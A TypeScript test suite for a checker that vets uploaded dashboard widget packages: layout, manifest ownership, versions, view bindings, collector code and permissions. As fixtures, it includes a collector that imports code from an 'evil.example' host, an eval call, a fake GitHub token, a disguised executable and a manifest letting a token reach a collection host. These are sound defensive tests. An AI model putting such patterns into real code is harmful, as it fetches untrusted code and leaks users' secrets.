import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'

import { checks } from '@shiftpane/format'
import { describe, expect, it } from 'vitest'

import { openPackage, packPackage } from './package.ts'
import { type CheckContext, checkPackage, manifestIdOf } from './run.ts'

const firstParty = join(import.meta.dirname, '../../../first-party')

function folder(id: string): Record<string, string> {
  const dir = join(firstParty, id)
  return Object.fromEntries(
    readdirSync(dir).map((name) => [name, readFileSync(join(dir, name), 'utf8')]),
  )
}

const official: CheckContext = { uploader: { login: 'shiftpane', official: true } }

/** gpu-ring as octocat's: a bindings-only widget that passes everything. */
function octocatRing(
  edit: (files: Record<string, string>, manifest: Record<string, unknown>) => void = () => {},
) {
  const files = folder('gpu-ring')
  const manifest = JSON.parse(files['manifest.json'] ?? '{}')
  manifest.id = 'octo-ring'
  manifest.author = 'octocat'
  edit(files, manifest)
  files['manifest.json'] = JSON.stringify(manifest)
  return packPackage(files)
}

const octocat: CheckContext = {
  uploader: { login: 'octocat', githubCreatedAt: new Date('2011-01-25') },
}

const check = (zip: Uint8Array, context: CheckContext = octocat) =>
  checkPackage(openPackage(zip), context)

describe('first-party widgets', () => {
  for (const id of readdirSync(firstParty)) {
    it(`${id} passes every failing check`, () => {
      const result = check(packPackage(folder(id)), official)
      const failed = Object.entries(result.report).filter(([, entry]) => entry.result === 'fail')
      expect(failed).toEqual([])
      expect(result.passed).toBe(true)
      expect(result.manifest?.id).toBe(id)
    })
  }

  it('reports every check', () => {
    const result = check(packPackage(folder('github-stars')), official)
    expect(Object.keys(result.report).sort()).toEqual(checks.map((c) => c.id).sort())
  })

  it('flags what a reviewer should look at', () => {
    expect(check(packPackage(folder('hardware-temps')), official).report.local?.result).toBe('flag')
    expect(check(packPackage(folder('github-stars')), official).report.sandbox?.result).toBe('skip')
    expect(check(packPackage(folder('gpu-ring')), official).report.sandbox?.result).toBe('pass')
  })
})

describe('layout', () => {
  it('fails on files that are not allowed, and skips the rest', () => {
    const files = folder('gpu-ring')
    const result = check(packPackage({ ...files, 'payload.exe': 'MZ' }), official)
    expect(result.report.layout?.result).toBe('fail')
    expect(result.report.layout?.note).toContain('payload.exe')
    expect(result.report.manifest?.result).toBe('skip')
    expect(result.passed).toBe(false)
  })

  it('fails when a required file is missing', () => {
    const { LICENSE: _, ...files } = folder('gpu-ring')
    expect(check(packPackage(files), official).report.layout?.note).toContain('LICENSE is missing')
  })

  it('fails on something that is not a zip', () => {
    expect(check(new TextEncoder().encode('not a zip'), official).report.layout?.note).toContain(
      "can't be read",
    )
  })

  it('fails when the files add up to more than 1 MB', () => {
    const big = 'x'.repeat(1100 * 1024)
    const result = check(packPackage({ ...folder('gpu-ring'), 'README.md': big }), official)
    expect(result.report.layout?.note).toMatch(/limit is 1,024 KB/)
  })

  it('accepts PNG screenshots and refuses other files posing as them', () => {
    const png = new Uint8Array([
      0x89,
      0x50,
      0x4e,
      0x47,
      0x0d,
      0x0a,
      0x1a,
      0x0a,
      ...new Array(20).fill(0),
    ])
    const ok = check(
      packPackage({ ...folder('gpu-ring'), 'screenshots/small.png': png } as Record<
        string,
        Uint8Array | string
      >),
      official,
    )
    expect(ok.report.layout?.result).toBe('pass')
    const bad = check(
      packPackage({ ...folder('gpu-ring'), 'screenshots/small.png': 'GIF89a' }),
      official,
    )
    expect(bad.report.layout?.note).toContain("isn't a PNG")
  })
})

describe('manifest', () => {
  it('reads the id before checking', () => {
    expect(manifestIdOf(openPackage(octocatRing()))).toBe('octo-ring')
  })

  it('passes for an author uploading their own widget', () => {
    expect(check(octocatRing()).passed).toBe(true)
  })

  it('fails when the author is someone else', () => {
    const result = check(octocatRing((_, m) => (m.author = 'someone')))
    expect(result.report.manifest?.note).toContain('octocat')
  })

  it('keeps reserved ids for first-party widgets', () => {
    const result = check(octocatRing((_, m) => (m.id = 'pc-stats')))
    expect(result.report.manifest?.result).toBe('fail')
  })

  it('refuses an id another author owns', () => {
    const result = check(octocatRing(), {
      ...octocat,
      existing: { ownerLogin: 'mona', versions: [] },
    })
    expect(result.report.manifest?.note).toContain('another author')
  })

  it('explains schema errors with their path', () => {
    const result = check(octocatRing((_, m) => (m.permissions = { network: ['https://x.com/'] })))
    expect(result.report.manifest?.note).toContain('permissions.network.0')
  })
})

describe('version', () => {
  const versions = (...list: [string, 'approved' | 'rejected' | 'in_review'][]) => ({
    ...octocat,
    existing: {
      ownerLogin: 'octocat',
      versions: list.map(([version, status]) => ({
        version,
        status,
        permissions: {
          sources: ['gpu' as const],
          actions: [],
          local: [],
          network: [],
          secrets: [],
        },
      })),
    },
  })

  it('has to be higher than every version not rejected', () => {
    expect(check(octocatRing(), versions(['1.0.0', 'approved'])).report.version?.result).toBe(
      'pass',
    )
    expect(check(octocatRing(), versions(['1.2.0', 'in_review'])).report.version?.note).toContain(
      'higher than 1.2.0',
    )
    expect(check(octocatRing(), versions(['1.1.0', 'approved'])).report.version?.note).toContain(
      'already uploaded',
    )
  })

  it('lets a rejected version number be used again', () => {
    expect(check(octocatRing(), versions(['1.1.0', 'rejected'])).report.version?.result).toBe(
      'pass',
    )
  })

  it('flags permissions added since the last approved version', () => {
    const result = check(
      octocatRing((_, m) => {
        m.permissions = { sources: ['gpu', 'cpu'] }
      }),
      versions(['1.0.0', 'approved']),
    )
    expect(result.report.added?.result).toBe('flag')
    expect(result.report.added?.note).toContain('CPU')
  })
})

describe('view', () => {
  it('fails on a source the manifest does not declare', () => {
    const result = check(octocatRing((_, m) => (m.permissions = { sources: [] })))
    expect(result.report.view?.note).toContain('permissions.sources')
  })

  it('fails on a collector binding without a collector', () => {
    const result = check(
      octocatRing((files) => {
        files['view.json'] = JSON.stringify({
          small: { type: 'value', bind: '/count' },
          medium: { type: 'label', text: 'x' },
        })
      }),
    )
    expect(result.report.view?.note).toContain('no collector.js')
  })

  it('fails when a size has no tree', () => {
    const result = check(octocatRing((_, m) => (m.sizes = ['small', 'medium', 'large'])))
    expect(result.report.view?.note).toContain('no tree for it')
  })
})

describe('collector and code', () => {
  const withCollector = (code: string, sample = '{"n":1}') =>
    octocatRing((files, m) => {
      files['collector.js'] = code
      files['sample.json'] = sample
      m.refreshSeconds = 60
    })

  it('allows only defineCollector as an import', () => {
    const ok = check(
      withCollector(
        "import { defineCollector } from '@shiftpane/widget-sdk'\nexport default defineCollector(() => ({ n: 1 }))\n",
      ),
    )
    expect(ok.report.collector?.result).toBe('pass')
    const bad = check(withCollector("import fs from 'node:fs'\nexport default () => fs\n"))
    expect(bad.report.collector?.note).toContain('node:fs')
  })

  it('fails on dynamic import and a missing default export', () => {
    const result = check(
      withCollector("export const run = () => import('https://evil.example/x.js')\n"),
    )
    expect(result.report.collector?.note).toContain('import()')
    expect(result.report.collector?.note).toContain('default export')
  })

  it('fails on code that does not parse', () => {
    expect(check(withCollector('export default {')).report.collector?.result).toBe('fail')
  })

  it('flags eval and minified lines', () => {
    const result = check(withCollector(`export default () => eval('1');${' '.repeat(600)}\n`))
    expect(result.report.obfuscation?.result).toBe('flag')
    expect(result.report.obfuscation?.note).toContain('eval')
    expect(result.report.obfuscation?.note).toContain('characters long')
  })

  it('fails on an embedded token without repeating it', () => {
    const token = `ghp_${'a1B2'.repeat(9)}`
    const result = check(withCollector(`const t = '${token}'\nexport default () => t\n`))
    expect(result.report.credentials?.result).toBe('fail')
    expect(result.report.credentials?.note).not.toContain(token)
  })
})

describe('permissions', () => {
  it("flags a secret that can reach another service's host", () => {
    const result = check(
      octocatRing((_, m) => {
        m.permissions = {
          sources: ['gpu'],
          network: ['api.github.com', 'collect.example.com'],
          secrets: ['GITHUB_TOKEN'],
        }
      }),
    )
    expect(result.report.secrets?.result).toBe('flag')
    expect(result.report.secrets?.note).toContain('collect.example.com')
  })

  it('flags revealing sources with network access, and trackers', () => {
    const result = check(
      octocatRing((_, m) => {
        m.permissions = { sources: ['gpu', 'media'], network: ['www.google-analytics.com'] }
      }),
    )
    expect(result.report.flow?.result).toBe('flag')
    expect(result.report.trackers?.result).toBe('flag')
  })

  it('flags new GitHub accounts', () => {
    const young = {
      uploader: { login: 'octocat', githubCreatedAt: new Date('2026-10-10') },
      now: new Date('2026-10-20'),
    }
    expect(check(octocatRing(), young).report.account?.note).toContain('10 days old')
  })
})
